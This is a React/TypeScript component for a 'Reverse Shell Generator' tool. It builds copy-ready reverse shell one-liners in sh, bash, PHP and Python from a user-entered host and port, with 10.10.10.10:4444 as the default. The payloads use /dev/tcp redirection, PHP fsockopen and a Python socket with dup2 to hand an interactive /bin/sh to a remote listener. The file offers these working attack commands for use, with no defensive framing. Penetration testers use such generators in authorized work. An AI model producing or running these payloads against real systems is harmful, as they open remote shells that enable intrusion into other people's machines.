import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Copy, Check } from "lucide-react";

export function ReverseShellGenerator() {
  const [host, setHost] = useState("10.10.10.10");
  const [port, setPort] = useState("4444");
  const [copied, setCopied] = useState<string | null>(null);

  const shells = {
    sh: (h: string, p: string) => 
      `sh -i >& /dev/tcp/${h}/${p} 0>&1`,
    bash: (h: string, p: string) => 
      `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
    php: (h: string, p: string) => 
      `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    python: (h: string, p: string) => 
      `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
  };

  const copyToClipboard = async (text: string, type: string) => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(type);
      setTimeout(() => setCopied(null), 2000);
    } catch (err) {
      console.error("Failed to copy:", err);
    }
  };

  return (
    <Card className="w-full max-w-4xl">
      <CardHeader>
        <CardTitle>Reverse Shell Generator</CardTitle>
        <CardDescription>
          Generate reverse shell payloads for various languages
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Label htmlFor="host">Host/IP</Label>
            <Input
              id="host"
              placeholder="10.10.10.10"
              value={host}
              onChange={(e) => setHost(e.target.value)}
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="port">Port</Label>
            <Input
              id="port"
              placeholder="4444"
              value={port}
              onChange={(e) => setPort(e.target.value)}
            />
          </div>
        </div>

        <Tabs defaultValue="sh" className="w-full">
          <TabsList className="grid w-full grid-cols-4">
            <TabsTrigger value="sh">sh</TabsTrigger>
            <TabsTrigger value="bash">Bash</TabsTrigger>
            <TabsTrigger value="php">PHP</TabsTrigger>
            <TabsTrigger value="python">Python</TabsTrigger>
          </TabsList>

          {Object.entries(shells).map(([key, generator]) => {
            const payload = host && port ? generator(host, port) : "";
            return (
              <TabsContent key={key} value={key} className="space-y-2">
                <div className="relative">
                  <pre className="bg-muted p-4 rounded-lg overflow-x-auto text-sm whitespace-pre-wrap break-all">
                    <code>{payload || "Enter host and port to generate payload"}</code>
                  </pre>
                  {payload && (
                    <Button
                      size="icon-sm"
                      variant="ghost"
                      className="absolute top-2 right-2"
                      onClick={() => copyToClipboard(payload, key)}
                    >
                      {copied === key ? (
                        <Check className="h-4 w-4 text-green-500" />
                      ) : (
                        <Copy className="h-4 w-4" />
                      )}
                    </Button>
                  )}
                </div>
              </TabsContent>
            );
          })}
        </Tabs>
      </CardContent>
    </Card>
  );
}
